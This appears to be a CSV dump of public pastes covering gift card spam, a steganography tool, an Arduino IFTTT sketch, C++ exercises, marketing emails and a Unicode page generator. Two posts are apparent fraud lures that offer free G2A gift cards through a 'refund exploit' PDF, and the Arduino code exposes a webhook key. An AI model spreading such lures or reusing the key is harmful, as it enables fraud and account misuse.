id,title,username,language,date,content
r3byQqxT,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Friday 8th of March 2024 06:04:53 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_270922.pdf

Working as of:
08 March 2024"
P6GnFdut,data863,TestGuy1,JSON,Friday 8th of March 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '14546f7f031b815e286565bc38e77f83a43c3021b18e661a2958835c1cd706635953c0a13ca098184f4f0a4aa8c93b0777eeac96603f11bff0788bd946c0f951642e09bfc6b963d1eb2ecb11fc3e6851af40482f6ed7bba00a5e490ace7dfa56767e489bffb39ba40c1d5ff74e1f7372be666420864c5be560f4ea9b5f5f1880',
  otherdata: [
    'b5f03a2fc3562f0032e3766e83747e22',
    '2401ab5b577366fdd2cfe2693cda2ede',
    '31d24e7f997cf026298a861caba18775',
    '40d52c1334409ad01744e453cec11701',
    '49d344a2a9d8dc10aea9e2061ed5da55',
    '2f970c3cc9708ba34e1e98427ef112e4',
    '1683382b0211b4c1e628c2da6e942174',
    'eaf0d0eeeaee2049c22f02d2f492def0'
  ]
}"
ve039A0q,STEGANO-VIWE-IMAGE2.py,Najeebsk,Python,Friday 8th of March 2024 06:00:05 AM CDT,"import os
import numpy as np
from imageio.v2 import imread, imwrite
import tkinter as tk
from PIL import Image, ImageTk
import subprocess

max_value = 255  # max uint value per pixel per channel
header_len = 4 * 8  # uint32 bit length

def read_image(img_path):
    img = np.array(imread(img_path), dtype=np.uint8)
    orig_shape = img.shape
    return img.flatten(), orig_shape

def write_image(img_path, img_data, shape):
    img_data = np.reshape(img_data, shape)
    imwrite(img_path, img_data)

def bytes2array(byte_data):
    byte_array = np.frombuffer(byte_data, dtype=np.uint8)
    return np.unpackbits(byte_array)

def array2bytes(bit_array):
    byte_array = np.packbits(bit_array)
    return byte_array.tobytes()

def read_file(file_path):
    file_bytes = open(file_path, ""rb"").read()
    return bytes2array(file_bytes)

def write_file(file_path, file_bit_array):
    bytes_data = array2bytes(file_bit_array)
    with open(file_path, 'wb') as f:
        f.write(bytes_data)

def encode_data(image, file_data):
    or_mask = file_data
    and_mask = np.zeros_like(or_mask)
    and_mask = (and_mask + max_value - 1) + or_mask 
    res = np.bitwise_or(image, or_mask)
    res = np.bitwise_and(res, and_mask)
    return res

def decode_data(encoded_data):
    out_mask = np.ones_like(encoded_data)
    output = np.bitwise_and(encoded_data, out_mask)
    return output

def hide_images():
    original_file = original_entry_hide.get()
    hide_file = hide_entry_hide.get()
    save_file = save_entry_hide.get()
    img_path = f'DEEPFAKE/{original_file}.jpg'
    file_path = f'DEEPFAKE/{hide_file}.jpg'
    output_path = f'DATA/{save_file}.png'

    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return
    if not os.path.isfile(file_path):
        print(""File does not exist"")
        return

    image, shape_orig = read_image(img_path)
    file = read_file(file_path)
    file_len = file.shape[0]
    len_array = np.array([file_len], dtype=np.uint32).view(np.uint8)
    len_array = np.unpackbits(len_array)
    img_len = image.shape[0]

    if file_len >= img_len - header_len:
        print(""File too big, error"")
        return
    else:
        tmp = file
        file = np.random.randint(2, size=img_len, dtype=np.uint8)
        file[header_len:header_len+file_len] = tmp

    file[:header_len] = len_array
    encoded_data = encode_data(image, file)

    write_image(output_path, encoded_data, shape_orig)
    print(""Image encoded"")

    preview_img = Image.fromarray(encoded_data.reshape(shape_orig))
    photo = ImageTk.PhotoImage(preview_img)
    lbl.config(image=photo)
    lbl.image = photo

def unhide_images():
    original_file = original_entry_unhide.get()
    save_file = save_entry_unhide.get()
    img_path = f'DATA/{original_file}.png'
    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return

    encoded_data, shape_orig = read_image(img_path)
    data = decode_data(encoded_data)
    el_array = np.packbits(data[:header_len])
    extracted_len = el_array.view(np.uint32)[0]
    data = data[header_len:extracted_len+header_len]
    write_file(f'DATA/{save_file}.jpg', data)
    print(""Image decoded and saved"")

    # Load and display the original PNG image in frame 1
    original_image_path = f'DATA/{original_file}.png'
    original_image = Image.open(original_image_path)
   # original_image.thumbnail((shape_orig[0] // 3, shape_orig[1]))  # Resize if needed
    original_photo = ImageTk.PhotoImage(original_image)
    lbl.config(image=original_photo)
    lbl.image = original_photo

    saved_image_path = f'DATA/{save_file}.jpg'
    #subprocess.Popen(['start', saved_image_path], shell=True)

    # Load the saved image for display in Frame2
    saved_image = Image.open(saved_image_path)
    #saved_image.thumbnail((shape_orig[0] // 3, shape_orig[1]))  # Resize if needed
    saved_photo = ImageTk.PhotoImage(saved_image)
    lbl2.config(image=saved_photo)
    lbl2.image = saved_photo

root = tk.Tk()
root.geometry(""1000x660"")
root.title(""Hide and Unhide Images"")

# Frame for Original Image
f = tk.Frame(root, bd=3, bg=""#2c3e50"", width=500, height=630, relief=tk.GROOVE)
f.place(x=5, y=10)

tk.Label(f, text=""Open Original Image:"").place(x=10, y=10)
original_entry_hide = tk.Entry(f)
original_entry_hide.place(x=150, y=10)

tk.Label(f, text=""Open Image to Hide:"").place(x=10, y=40)
hide_entry_hide = tk.Entry(f)
hide_entry_hide.place(x=150, y=40)

tk.Label(f, text=""Save Hidden Image:"").place(x=10, y=70)
save_entry_hide = tk.Entry(f)
save_entry_hide.place(x=150, y=70)

hide_button = tk.Button(f, text=""Hide"", command=hide_images)
hide_button.place(x=150, y=100)

lbl = tk.Label(f, bg=""#2c3e50"")
lbl.place(x=10, y=140)

# Frame for Unhidden Image
frame2 = tk.Frame(root, bd=3, width=500, height=630, relief=tk.GROOVE, bg=""#34495e"")
frame2.place(x=505, y=10)

tk.Label(frame2, text=""Open Encoded Image:"").place(x=10, y=10)
original_entry_unhide = tk.Entry(frame2)
original_entry_unhide.place(x=150, y=10)

tk.Label(frame2, text=""Save Unhidden Image:"").place(x=10, y=40)
save_entry_unhide = tk.Entry(frame2)
save_entry_unhide.place(x=150, y=40)

unhide_button = tk.Button(frame2, text=""Unhide"", command=unhide_images)
unhide_button.place(x=150, y=70)

lbl2 = tk.Label(frame2, bg=""#34495e"")
lbl2.place(x=10, y=100)

root.mainloop()
"
e8EY0bGr,omnihypnosis.com - purchase,chiragsolanki,JavaScript,Friday 8th of March 2024 05:47:09 AM CDT,"window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
  event: 'GA4_purchase',            // name of the event. In this case, it always must be GA4_purchase
  ecommerce: {
    currency: 'CHF',
    value: 575.00,                       // order total
    tax: 00.00,                          // If tax available 
    transaction_id: 'abc123',           // transaction id
    coupon: 'coupon code',          // if coupon was applied to the order, include it here          
    items: [{                           // an array with all products
      item_name: 'OMNI Hypnotiseur Zertifizierung online',           // insert an actual product name
      item_id: 'product1',              // insert an actual product ID
      price: 575.00,                 // insert an actual product price
      quantity: '1',                    // product quantity
    }]
  }
});"
rs4GGJQg,ServerDisconnectedError: Server disconnected,basedcount_bot,Python,Friday 8th of March 2024 05:19:52 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 45, in wrapper
    await func(lemmy_instance, databased)
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 227, in read_comments
    async for comment in lemmy_instance.stream_comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/async_lemmy.py"", line 63, in stream_comments
    comments = await self.request_builder.get(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/request_builder.py"", line 57, in get
    async with self.client_session.get(url, headers=headers, params=params) as resp:
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client.py"", line 1187, in __aenter__
    self._resp = await self._coro
                 ^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client.py"", line 601, in _request
    await resp.start(conn)
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client_reqrep.py"", line 965, in start
    message, payload = await protocol.read()  # type: ignore[union-attr]
                       ^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/streams.py"", line 622, in read
    await self._waiter
aiohttp.client_exceptions.ServerDisconnectedError: Server disconnected
"
gp1KZpXL,G2A.com Free Gift Card Guide Mar 2024 Updated,HastyBasher0,GetText,Friday 8th of March 2024 04:57:16 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1QX2f9c6IIh85U8kry1bxwlS9OdjQFGFZ/view?usp=sharing
or
https://smallpdf.com/file#s=e45853d1-004b-4ae4-968e-c4f2afc13e32
 
Working as of:
08 March 2024"
kSezH9zr,Soccer Prediction Betting Tips 08032024,livebetpro,PHP,Friday 8th of March 2024 04:54:22 AM CDT,https://www.livebetpro.com/soccer-prediction-betting-tips-08032024/
ME8hcAYc,Untitled,sissou123,C,Friday 8th of March 2024 04:53:02 AM CDT,"C Programming Bootcamp - The Complete C Language Course
C Programming 2024: Master the Fundamentals of C Programming Language. Join the Comprehensive C Bootcamp Masterclass! 
What you'll learn
Fundamentals of Programming
Summarised & Concise Material [Saving TONS of Time!]  
for more:https://urlis.net/h7r5w75y

"
r23enTM1,Untitled,sissou123,C,Friday 8th of March 2024 04:48:52 AM CDT,"C Programming Masterclass: Pointers & Advanced C Language
C Programming Advanced Topics: Pointers, Memory, Low-Level C Language and Embedded C Preparation 
What you'll learn
Introduction To Pointers For Beginners
Pointers Declaration, Initialization, and Usage 
for more:https://urlis.net/wx7eywhj
"
EUfGRkgf,Drone Project #3,zhexo,Arduino,Friday 8th of March 2024 04:31:32 AM CDT,"#include <SoftwareSerial.h>
#include <String.h>
#include <Wire.h>
//BMP180 basınç sensörü kütüphanesini ekleyiniz
#include <SFE_BMP180.h>

//bmp180 sensör nesnesini oluşturunuz
SFE_BMP180 bmp180;  
 
SoftwareSerial gprsSerial(8,7); //RX, TX

//Webhook Key Bilgisi
String KEY=""dJBRnRYfGMSFa4JVDNthUD"";

//Webhook Event Name Bilgisi
String EVENT_NAME=""olcum"";

//Bu fonksiyon ile gprs haberleşmesini Serial monitöre yazdırarak debug ediyoruz.
void ShowSerialData()
{
  while(gprsSerial.available()!=0)
    Serial.write(gprsSerial.read());
  delay(5000); 
}

void setup()
{
  //GPRS shield baud hızını ayarlıyoruz.
  gprsSerial.begin(9600); 

  Serial.begin(9600);   
  bool baslatildiMi = bmp180.begin();
  if (baslatildiMi) {
    Serial.println(""BMP180 baslatildi."");
  }
  delay(500);

  //Gönderdiğimiz komutların sorunsuzca ulaşıp ulaşmadığını test ediyoruz
  gprsSerial.println(""AT"");
  delay(1000);
 
  //Sim kart pin durumunu sorguluyoruz
  gprsSerial.println(""AT+CPIN?"");
  delay(1000);
 
  //Şebeke kontrolünü yapıyoruz
  gprsSerial.println(""AT+CREG?"");
  delay(1000);
 
  //GPRS bağlantısını kontrol ediyoruz
  gprsSerial.println(""AT+CGATT?"");
  delay(1000);
 
  //Varsa IP oturumunu sıfırlıyoruz
  gprsSerial.println(""AT+CIPSHUT"");
  delay(1000);
 
  gprsSerial.println(""AT+CIPSTATUS"");
  delay(2000);
 
  //Tekli bağlantı kuruyoruz
  gprsSerial.println(""AT+CIPMUX=0"");
  delay(2000);
  ShowSerialData();
 
  //APN ayarlarını yapıyoruz
  gprsSerial.println(""AT+CSTT=\""internet\"""");
  delay(1000);
  ShowSerialData();
 
  //Kablosuz bağlantıyı açıyoruz
  gprsSerial.println(""AT+CIICR"");
  delay(3000);
  ShowSerialData();
 
  //Bağlantı sağlandığında yerel IP adresini alıyoruz
  gprsSerial.println(""AT+CIFSR"");
  delay(2000);
  ShowSerialData();
 
  gprsSerial.println(""AT+CIPSPRT=0"");
  delay(3000);
  ShowSerialData();
}
 
void loop()
{ 
  //BMP180 sensöründen okunan durumu tutacak değişkeni tanımlıyoruz
  char durum;
  //Sıcaklık ve basınç değişkenlerini tanımlıyoruz
  double sicaklik=0;  
  double basinc=0;
    
  //IFTTT domain adına TCP bağlantısını başlatıyoruz
  gprsSerial.println(""AT+CIPSTART=\""TCP\"",\""maker.ifttt.com\"",\""80\"""");
  delay(6000);
  ShowSerialData();
 
  //Uzak sunucuya veri gönderiyoruz
  gprsSerial.println(""AT+CIPSEND"");
  delay(4000);
  ShowSerialData();

  //BMP180 sensörü ile basınç ve sıcaklık ölçümü yapıyoruz
  durum = bmp180.startTemperature();

  if (durum != 0) {
    delay(1000);
    durum = bmp180.getTemperature(sicaklik);

    if (durum != 0) {
      durum = bmp180.startPressure(3);

      if (durum != 0) {
        delay(durum);
        durum = bmp180.getPressure(basinc, sicaklik);

        if (durum != 0) {
          Serial.print(""Basınç: "");
          Serial.print(basinc);
          Serial.println("" hPa"");

          Serial.print(""Sıcaklık: "");
          Serial.print(sicaklik);
          Serial.println("" C"");
        }
      }
    }
  }
  
  //IFTTT'ye GET isteğinde bulunuyoruz
  String istek=""GET https://maker.ifttt.com/trigger/""+EVENT_NAME+""/with/key/""+KEY+""?value1=""+String(sicaklik)+""C&value2=""+String(basinc)+""hPa"";
  Serial.println(istek);
  //Uzak sunucuya veriyi göndermek için istekde bulunuyoruz
  gprsSerial.println(istek);
  delay(4000);
  ShowSerialData();
 
  //Ctrl+Z ile verinin gönderimini sağlıyoruz
  //Cevap bekliyoruz, Zaman internetin durumuna bağlıdır.
  gprsSerial.println((char)26);
  delay(5000);
  gprsSerial.println();
  ShowSerialData();
 
  //Bağlantıyı kapatıyoruz
  gprsSerial.println(""AT+CIPSHUT"");
  delay(100);
  ShowSerialData();
}
 "
2rwP8YN3,Find Jumble Words Noice,akbarsahata,JavaScript,Friday 8th of March 2024 04:28:05 AM CDT,"function findJumbleWords(str = '') {
    const words = str.split(' ')

    const jumbleWords = new Set()

    for (let i = 0; i < words.length; i++) {
        if (words[i].length < 2) {
            continue;
        }

        for (let j = 0; j < words.length; j++) {
            if (i !== j) {
                let wordI = words[i].split('')
                let wordJ = words[j].split('')

                while (wordI.length > wordJ.length && j < words.length - 1) {
                    wordJ += words[j + 1]
                }

                for (let k = 0; k < wordI.length; k++) {
                    const letter = wordI[k];

                    const index = wordJ.indexOf(letter)

                    if (index === -1) break

                    if (k === wordI.length -1) {
                        jumbleWords.add(words[i])
                    }
                }
            }
        }
    }

    return Array.from(jumbleWords).join(' ')
}

const input = 'a gentleman and elegant man listen them silent';

console.log(findJumbleWords(input));"
jMqvjsUW,Untitled,Josif_tepe,C++,Friday 8th of March 2024 04:19:07 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;
int n;
int a[33];
long long k;
bool check(long long x) {
    long long sum = 0;
    for(int i = 0; i < n; i++) {
        sum += x / a[i];
    }
    if(sum >= k) {
        return true;
    }
    return false;
}
    
int main()
{
    cin >> n >> k;
    for(int i = 0; i < n; i++) {
        cin >> a[i];
    }
    
    long long L = 0,R = 1e15;
    long long res = 1e18;
    
    while(L <= R) {
        long long mid = (L + R) / 2;
        if(check(mid)) {
            res = min(res, mid);
            R = mid - 1;
        }
        else {
            L = mid + 1;
        }
    }
    cout << res << endl;
    return 0;
}
// 1300 100 2000 45  50



"
cXr3ePT9,IDKFree,KingSlayer05,Lua,Friday 8th of March 2024 04:14:08 AM CDT,"return {
       ""DinosaurLordKing_K2"",
       ""DinosaurLordKing_K3"",       
}"
4Ya93G74,Untitled,Josif_tepe,C++,Friday 8th of March 2024 03:49:55 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;

    
int main()
{
    int k, n;
    cin >> k >> n;
    vector<int> a(n);
    vector<int> b(n);
    for(int i = 0; i < n; i++) {
        cin >> a[i];
    }
    for(int i = 0; i < n; i++) {
        cin >> b[i];
    }
    sort(a.begin(), a.end());
    sort(b.begin(), b.end());
    long long res = 0;
    for(int i = 0; i < n; i++) {
        int diff = k - a[i];
        int idx = lower_bound(b.begin(), b.end(), diff) - b.begin();
        if(idx >= 0 and idx < n) {
            res += n - idx;
        }
    }
    cout << res << endl;
    return 0;
}
// 1300 100 2000 45  50



"
gs7GK1wV,IdkPAID,KingSlayer05,Lua,Friday 8th of March 2024 03:37:49 AM CDT,"return {
		""80.202.102.29""
}"
59DsV2d6,Ovo je vaš novi Battlepass na Grand RP-u!,Shpindlier,HTML,Friday 8th of March 2024 03:13:03 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/16rKcmn.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Update za prošlu nedelju će biti dopunjen. Uskoro ćete imati pristup novom Battlepass-u. Ne zaboravite da do kraja nedelje imate priliku da zaradite 15 GC igrajući samo 5 sati na našem serveru. Ne propustite!</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
1CG0U5DQ,Untitled,Josif_tepe,C++,Friday 8th of March 2024 03:05:48 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;

    
int main()
{
    int n;
    cin >> n;
    vector<int> v(n);
    
    for(int i = 0; i < n; i++) {
        cin >> v[i];
    }
    sort(v.begin(), v.end());
    for(int j = 0; j < 5; j++) {
        int x;
        cin >> x;
        
        int idx = lower_bound(v.begin(), v.end(), x) - v.begin();
        if(idx == n) {
            cout << ""BROJOT NE POSTOI\n"" << endl;
        }
        else {
            cout << idx << "" "" << v[idx] << endl;
        }
    }
    return 0;
}
// 1300 100 2000 45  50
"
Ly1MuQzK,Untitled,Josif_tepe,C++,Friday 8th of March 2024 02:55:26 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;

    
int main()
{
    int n;
    cin >> n;
    vector<int> v(n);
    
    for(int i = 0; i < n; i++) {
        cin >> v[i];
    }
    sort(v.begin(), v.end());
    int x;
    cin >> x;
    
    int L = 0, R = n - 1;
    while(L <= R) {
        cout << ""L="" << L<<"", R="" << R << endl;
        int mid = (L + R) / 2;
        if(x == v[mid]) {
            cout << ""Brojot postoi i se naoga tuka: "" << mid << endl;
            break;
        }
        else if(x < v[mid]) {
            R = mid - 1;
        }
        else {
            L = mid + 1;
        }
    }
    return 0;
}
// 1300 100 2000 45  50
"
p4Yj4eE8,Der neue Battlepass auf GrandRP!,Shpindlier,HTML,Friday 8th of March 2024 02:53:55 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/16rKcmn.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Die Veröffentlichung von letzter Woche wird ergänzt. Bald erhaltet Ihr Zugriff auf den neuen Battlepass. Vergesst nicht, dass bis zum Ende der Woche die Möglichkeit besteht 15 GC zu erhalten, indem Ihr nur 5 Stunden auf unserem Server spielt. Lasst euch das nicht entgehen!</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
D2MZ5EMT,all_utf8_symbols,Python253,Python,Friday 8th of March 2024 02:51:09 AM CDT,"#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# Filename: all_utf8_symbols.py
# Author: Jeoi Reqi

""""""
Full UTF-8 Symbols & Site Generator Script

This Python script creates an index page for a comprehensive UTF-8 symbol HTML reference, covering the entire Unicode range of 1,114,112 characters.
The index organizes these characters into pages, with each page containing 10,000 characters broken down into stylized tables displaying 100 characters at a time.

Requirements:
- Python 3
- Web Browser

Usage:
1. Ensure you have Python 3 installed on your system.
2. Run this script to generate the UTF-8 symbol HTML reference.
3. When prompted, choose whether to save the archive of symbols in groups of 10,000 per text file.
4. After all files have saved, open `index.html` in a web browser.
5. Keep the saved HTML files in the same folder as the index file.

Note:
- If chosen, individual TXT files for each range will be saved in the 'Archive' folder.
- The output HTML menu will be saved to `index.html`.
- All HTML files for the pages will be saved in the current working directory.
- Ensure an active internet connection for the script to fetch the necessary styles and fonts.
""""""

# IMPORTS
import os

# Function to create the individual pages
def generate_html_page(start, end, filename):
    """"""
    Generate an HTML page with stylized tables for a specified Unicode range.

    Parameters:
    - start (int): The starting Unicode code point of the range.
    - end (int): The ending Unicode code point of the range.
    - filename (str): The name of the HTML file to be generated.

    Returns:
    None
    """"""
    # Open the HTML file for writing
    with open(filename, ""w"", encoding=""utf-8"") as html_file:
        # Write the HTML header with metadata and styles
        html_file.write(f""<!DOCTYPE html>\n<html xmlns=\""http://www.w3.org/1999/xhtml\"">\n<head>""
                        f""<meta content=\""text/html; charset=utf-8\"" http-equiv=\""Content-Type\""/>""
                        f""<title>UTF-8 Symbols - Range {start}-{end}</title>""
                        f""<link rel=\""stylesheet\"" href=\""https://fonts.googleapis.com/css2?family=Amatic+SC:wght@700&display=swap\"">""
                        f""<style>""
                        f""body {{ font-family: 'Arial', sans-serif; background: linear-gradient(90deg, #000000 0%, #111e3a 100%); color: #808080; }}""
                        f""h1, h2 {{ font-family: 'Amatic SC', cursive; text-align: center; }}""
                        f""h1 {{ font-size: 90px; color: #336699; }}""
                        f""h2 {{ font-size: 30px; color: #808080; }}""
                        f""table {{ border-collapse: collapse; width: 100%; }}""
                        f""table, th, td {{ border: 1px solid #ddd; padding: 12px; }}""
                        f""th {{ background-color: #333333; color: #336699; font-size: 24px; }}""
                        f""details {{ margin-bottom: 10px; }}""
                        f""summary {{ cursor: pointer; color: #808080; font-size: 30px; font-family: 'Amatic SC', cursive; font-weight: bold; }}""
                        f""footer {{ text-align: center; margin-top: 40px; color: #808080; font-size: 20px; font-family: 'Amatic SC', cursive; font-weight: bold; }}""
                        f""</style>""
                        f""</head>\n<body>\n\t<h1>UTF-8 Symbols - Range {start}-{end}</h1>""
                        f""\t<h2>SELECT YOUR RANGE BELOW:</h2>""
                        f""\t<h2>⮛ ⮛ ⮛ ⮛ ⮛</h2>\n"")

        # Loop through each symbol code in the specified range
        sym_code = start
        while sym_code <= end:
            # Check if the current symbol code is a multiple of 100 (for table organization)
            modZero = sym_code % 100
            if modZero == 0:
                range_id = f""range_{sym_code}_{sym_code + 99}""
                unicode_range = f""U+{sym_code:04X} - U+{sym_code + 99:04X}""
                hex_range = f""{sym_code:X} - {sym_code + 99:X}""
                # Write the details section with Unicode and Hex range in the summary
                html_file.write(f""\n<details>\n\t<summary style='font-family: \""Amatic SC\"", cursive; font-weight: bold; font-size: 36px; color: #336699;'>{sym_code}-{sym_code + 99} (Uni: {unicode_range} / Hex: {hex_range})</summary>\n"")
                # Write the table header
                html_file.write(f""\t<table>\n\t\t<tr>\n\t\t\t<th style='font-family: \""Amatic SC\"", cursive; font-weight: bold; font-size: 30px; color: #336699;'>Unicode</th>\n""
                                f""\t\t\t<th style='font-family: \""Amatic SC\"", cursive; font-weight: bold; font-size: 30px; color: #336699;'>Hex</th>\n""
                                f""\t\t\t<th style='font-family: \""Amatic SC\"", cursive; font-weight: bold; font-size: 30px; color: #336699;'>Symbol</th>\n\t\t</tr>\n\n"")

            # Write each symbol entry in the table
            unicode_str = f""U+{sym_code:04X}""
            html_file.write(f""\t\t<tr>\n\t\t\t<td style='color: yellow; font-size: 24px;'>{unicode_str}</td>\n""
                            f""\t\t\t<td style='color: red; font-size: 24px;'>{sym_code:X}</td>\n""
                            f""\t\t\t<td style='color: #808080; font-size: 24px;'>&#x{sym_code:X};</td>\n""
                            f""\t\t</tr>\n\n"")

            # Check if the current symbol code is the last in the 100 block
            modFF = sym_code % 100
            if modFF == 99:
                # Close the table and details section
                html_file.write(""\t</table>\n</details>\n"")

            # Move to the next symbol code
            sym_code += 1

        # Write the footer with script information
        html_file.write(""\n\t<footer>\n""
                        ""\t\t<p>Generated by utf8_symbols.py</p>\n""
                        ""\t\t<p>Author: Jeoi Reqi</p>\n""
                        ""\t</footer>\n"")

        # Close the HTML file
        html_file.write(""\n\t</body></html>\n"")

# Function to create the index page
def generate_index_page(ranges, ranges_per_row):
    """"""
    Generate an index HTML page with links to individual range pages.

    Parameters:
    - ranges (list): A list of tuples representing Unicode ranges.
    - ranges_per_row (int): The number of ranges to display per row in the index.

    Returns:
    None
    """"""
    # Open the index HTML file for writing
    with open(""index.html"", ""w"", encoding=""utf-8"") as index_file:
        # Write the HTML header with metadata and styles
        index_file.write(f""<!DOCTYPE html>\n<html xmlns=\""http://www.w3.org/1999/xhtml\"">\n<head>""
                         f""<meta content=\""text/html; charset=utf-8\"" http-equiv=\""Content-Type\""/>""
                         f""<title>UTF-8 Symbols - Index</title>""
                         f""<link rel=\""stylesheet\"" href=\""https://fonts.googleapis.com/css2?family=Amatic+SC:wght@700&display=swap\"">""
                         f""<style>""
                         f""body {{ font-family: 'Arial', sans-serif; background: linear-gradient(90deg, #000000 0%, #111e3a 100%); color: #808080; }}""
                         f""h1, h2 {{ font-family: 'Amatic SC', cursive; text-align: center; }}""
                         f""h1 {{ font-size: 90px; color: #336699; }}""
                         f""h2 {{ font-size: 30px; color: #808080; }}""
                         f""#grid-container {{ display: grid; grid-template-columns: repeat({ranges_per_row}, 1fr); grid-gap: 20px; }}""
                         f"".grid-cell {{ text-align: center; padding: 20px; border: 1px solid #ddd; }}""
                         f""a {{ color: #336699; text-decoration: none; }}""
                         f""footer {{ text-align: center; margin-top: 40px; color: #808080; font-size: 20px; font-family: 'Amatic SC', cursive; font-weight: bold; }}""
                         f""</style>""
                         f""</head>\n<body>\n\t<h1>UTF-8 Symbols - Index</h1>""
                         f""\t<h2>SELECT YOUR RANGE BELOW:</h2>\n""
                         f""\t<h2>⮛ ⮛ ⮛ ⮛ ⮛</h2>\n""
                         f""\t<div id=\""grid-container\"">\n"")

        # Write links to individual range pages in a grid layout
        for start, end, filename in ranges:
            index_file.write(f""\t\t<div class=\""grid-cell\""><a href=\""{filename}\"">{start}-{end}</a></div>\n"")

        # Close the grid container
        index_file.write(""\n\t</div>"")
        
        # Add extra blank lines after the footer for padding
        index_file.write(""\n\t<br />\n\t<br />\n\t<br />\n\t<br />\n"")

        # Write the footer with script information
        index_file.write(""\n\t<footer>\n""
                         ""\t\t<p>Generated by utf8_symbols.py</p>\n""
                         ""\t\t<p>Author: Jeoi Reqi</p>\n""
                         ""\t</footer>\n"")

        # Close the HTML file
        index_file.write(""\n\t</body></html>\n"")

# Function to write Unicode symbols to a file with header
def write_unicode_to_file(file_name, start, end):
    with open(file_name, 'w', encoding='utf-8', errors='replace') as file:
        # Write header to the file
        file.write(""\n------------------------\nUNICODE \t\t SYMBOL \n------------------------\n"")
        
        # Write Unicode symbols and corresponding strings
        for code_point in range(start, end + 1):
            unicode_str = f'U+{code_point:04X}'
            try:
                symbol_str = chr(code_point)
            except ValueError:
                # Handle surrogate pairs explicitly
                high_surrogate = 0xD800 + ((code_point - 0x10000) >> 10)
                low_surrogate = 0xDC00 + ((code_point - 0x10000) & 0x3FF)
                symbol_str = f'{chr(high_surrogate)}{chr(low_surrogate)}'

            
            file.write(f'{unicode_str}\t\t\t\t{symbol_str}\t\n------------------------\n')
            


# Function to create a folder called Archive & Save the data to file.
def write_unicode_to_txt(start, end, ranges, chars_per_file):
    """"""
    Write Unicode values, hex values, and symbols to TXT files in groups of chars_per_file.

    Parameters:
